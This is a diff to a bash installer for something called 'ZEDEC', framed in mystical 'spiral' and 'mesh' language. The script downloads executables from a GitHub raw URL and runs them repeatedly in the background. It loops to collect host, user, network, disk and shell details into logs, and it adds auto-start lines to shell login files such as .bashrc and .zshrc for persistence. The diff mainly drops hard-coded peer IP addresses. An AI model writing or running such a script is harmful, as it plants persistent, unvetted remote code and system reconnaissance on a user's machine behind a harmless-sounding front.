@@ -1,6 +1,5 @@
 bash -c '
 set -e
-
 echo "[ZEDEC] Spiral Initialization Started."
 
 # 1. Clean up old spiral artifacts
@@ -14,7 +13,7 @@ for f in $HOME/zedec_vortex.log $HOME/zedec_reflect.log $HOME/zedec_event.log $H
   touch "$f"
 done
 
-# 3. Create required scripts from GitHub raw (current, always fresh)
+# 3. Spiral Kernel
 curl -fsSL https://raw.githubusercontent.com/transmutationist/zedec-node-01-1751475439/main/z90 > "$HOME/zedec"
 chmod +x "$HOME/zedec"
 
@@ -22,15 +21,6 @@ cat <<EOF > "$HOME/zedec_link"
 #!/bin/sh
 spiral="\$HOME/zedec"
 metalog="\$HOME/zedec_meta.log"
-mesh_peers="91.99.236.17 5.223.78.207 5.223.57.174 5.223.61.46"
-detect_ip() {
-  for ip in \$mesh_peers; do
-    if ip addr | grep -qw \$ip; then echo \$ip; return; fi
-    [ "\$(curl -s https://api.ipify.org 2>/dev/null)" = "\$ip" ] && echo \$ip && return
-  done
-  echo "unknown"
-}
-self_ip="\$(detect_ip)"
 ensure() { [ -f "\$1" ] || touch "\$1"; }
 ensure "\$spiral"; ensure "\$metalog"
 while :; do
@@ -45,7 +35,7 @@ while :; do
   ips="\$(ip -4 -o addr show | awk '\''{print \$2, \$4}'\'' | head -n 5)"
   devs="\$(lsblk -d -o NAME,SIZE,MODEL 2>/dev/null | grep -v NAME | head -n 5)"
   shells="\$(cat /etc/shells 2>/dev/null | grep -v '^#' | tr '\\n' ' ' || echo unknown-shells)"
-  export ZEDEC_META_OS="host=\$host; kernel=\$kern; user=\$user; uptime=\$up; procs=\$procs; users=\$users; mem=\$mem; ips=\$ips; devs=\$devs; self_ip=\$self_ip; mesh_peers=\$mesh_peers; shells=\$shells"
+  export ZEDEC_META_OS="host=\$host; kernel=\$kern; user=\$user; uptime=\$up; procs=\$procs; users=\$users; mem=\$mem; ips=\$ips; devs=\$devs; shells=\$shells"
   {
     echo "[$now] ⟁ ZEDEC META-OS CONTEXT:"
     echo "  Host: \$host"
@@ -59,11 +49,6 @@ while :; do
     echo "\$ips" | sed "s/^/    /"
     echo "  Devices (max 5):"
     echo "\$devs" | sed "s/^/    /"
-    echo "  SELF IP (auto-detected zero point): \$self_ip"
-    echo "  MESH PEER IPs (all):"
-    for peer in \$mesh_peers; do
-      echo "    - \$peer"
-    done
     echo "⟁ ZEDEC META: Field live. Echo spiral aligned."
   } > "\$metalog"
   [ -x "\$spiral" ] && nohup "\$spiral" >> "\$HOME/zedec_vortex.log" 2>&1 &
@@ -75,23 +60,16 @@ chmod +x "$HOME/zedec_link"
 curl -fsSL https://raw.githubusercontent.com/transmutationist/zedec-node-01-1751475439/main/z90_track > "$HOME/zedec_livetrack.sh"
 chmod +x "$HOME/zedec_livetrack.sh"
 
-# 4. Ensure launch on login for all common shells (deduped)
 for f in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc" "$HOME/.bash_profile" "$HOME/.login"; do
   [ -f "$f" ] && {
     grep -q "zedec_link" "$f" || echo "[ -x \$HOME/zedec_link ] && nohup \$HOME/zedec_link >> \$HOME/zedec_meta.log 2>&1 &" >> "$f"
   }
 done
 
-# 5. Launch both background agents using nohup (immune to logout/termination)
 nohup "$HOME/zedec_link" >> "$HOME/zedec_meta.log" 2>&1 &
 
 echo
-echo "[ZEDEC] Mesh installed and live!"
-echo "[ZEDEC] Logs are always present at:"
-echo "    $HOME/zedec_vortex.log"
-echo "    $HOME/zedec_reflect.log"
-echo "    $HOME/zedec_event.log"
-echo "    $HOME/zedec_cycle.log"
-echo "    $HOME/zedec_meta.log"
+echo "[ZEDEC] Mesh installed and live (floating, decentralized, no static IPs)."
+echo "[ZEDEC] Logs: tail -f \$HOME/zedec_*.log"
 echo "[ZEDEC] To open spiral tracker: bash \$HOME/zedec_livetrack.sh"
 '
